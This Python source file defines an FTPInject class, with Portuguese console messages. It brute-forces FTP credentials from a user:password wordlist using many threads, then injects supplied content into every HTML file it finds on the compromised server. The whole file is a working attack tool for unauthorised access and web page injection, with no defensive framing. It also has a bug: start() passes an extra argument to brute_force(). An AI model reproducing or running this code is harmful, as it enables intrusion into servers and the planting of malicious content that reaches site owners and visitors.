from threading import Thread
from ftpClient import FTPClient


class FTPInject:
    def __init__(self, host):
        self.host = host
        self._client: FTPClient = None
        
    def connect_ftp_client(self, user, password):
        try:
            ftp = FTPClient(self.host, user, password)
            if ftp.connect_ftp():
                self._client = ftp
        except Exception as e:
            pass

    def brute_force(self, password_file):
        file = open(password_file, 'r')
        
        threads = []
        for line in file.readlines():
            
            user = line.split(':')[0]
            password = line.split(':')[1].strip('\r').strip('\n')

            t = Thread(target=self.connect_ftp_client, args=(user, password))
            t.start()
            threads.append(t)

        [t.join() for t in threads]

        if self._client is None:
            print('\n[-] Não foi possível descobrir as credenciais FTP.')
            return (None, None)
        else:
            print('\n[+] Credenciais FTP encontradas: ' + self._client.user + ":" + self._client.password)
            return (self._client.user, self._client.password)


    def pages_patterns(self, content):
        web_files = ['html']
        files = self._client.file_filter()
        for file in files:
            if file.split('.')[-1] in web_files:
                print("Web Files: "+file)
                self._client.page_inject(file, content)
    
    def start(self, file, content):
        self.brute_force(file, content)

        if self._client:
            self.pages_patterns(content)